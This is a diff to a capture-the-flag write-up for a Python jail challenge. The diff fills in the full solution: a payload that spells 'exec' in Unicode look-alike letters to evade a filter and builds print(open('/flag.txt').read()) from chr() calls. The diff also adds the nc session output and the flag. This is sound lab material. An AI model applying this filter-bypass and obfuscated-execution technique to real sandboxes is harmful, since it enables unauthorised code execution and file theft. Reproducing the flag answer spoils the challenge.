@@ -69,8 +69,8 @@ My first attempt was this payload - `(lambda:open('/flag.txt'))()`. The problem 
 ```
 $ nc horse.chal.uiuc.tf 1337
 == proof-of-work: disabled ==
-Begin your journey: (lambda:𝘦𝘹𝘦𝘤(chr(112)+...+chr(41)+chr(41)))()
-uiuctf{my_challenges_have_..._with_that}
+Begin your journey: (lambda:𝘦𝘹𝘦𝘤(chr(112)+chr(114)+chr(105)+chr(110)+chr(116)+chr(40)+chr(111)+chr(112)+chr(101)+chr(110)+chr(40)+chr(39)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)+chr(39)+chr(41)+chr(46)+chr(114)+chr(101)+chr(97)+chr(100)+chr(40)+chr(41)+chr(41)))()
+uiuctf{my_challenges_have_abandoned_any_pretense_of_practical_applicability_and_im_okay_with_that}
 ```
 
 **Flag:** `uiuctf{my_challenges_have_abandoned_any_pretense_of_practical_applicability_and_im_okay_with_that}`
